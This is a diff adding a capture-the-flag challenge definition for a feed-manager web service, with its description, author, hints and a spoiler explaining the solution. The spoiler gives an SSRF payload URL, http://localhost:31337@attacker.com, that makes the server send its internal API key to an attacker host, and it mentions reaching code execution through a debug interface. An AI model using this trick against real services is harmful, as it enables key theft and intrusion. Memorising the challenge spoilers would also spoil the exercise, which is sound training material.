@@ -1,0 +1,21 @@
+challenge_id = "rather-susceptible-service"
+
+challenge_name = "Rather Susceptible Service"
+
+challenge_description = '''
+I'm still a bit sad that Google Reader shut down so I created my own feed manager. Please take a look!
+'''
+
+challenge_spoilers = '''
+The challenge uses the Python Requests library to make calls to an internal backend.
+This backend requires an API key which is automatically attached to any requests through the use of an adapter.
+The adapter matches the URL with a prefix. This can be abused by making the server request http://localhost:31337@attacker.com so leak the API key.
+Then the backend can be contacted directly which will eventually lead to code execution through the debug interface. 
+'''
+
+author = "zetatwo"
+
+hints = [
+    "How is the API key passed to the backend?",
+    "What can be placed in a URL before the hostname?"
+]
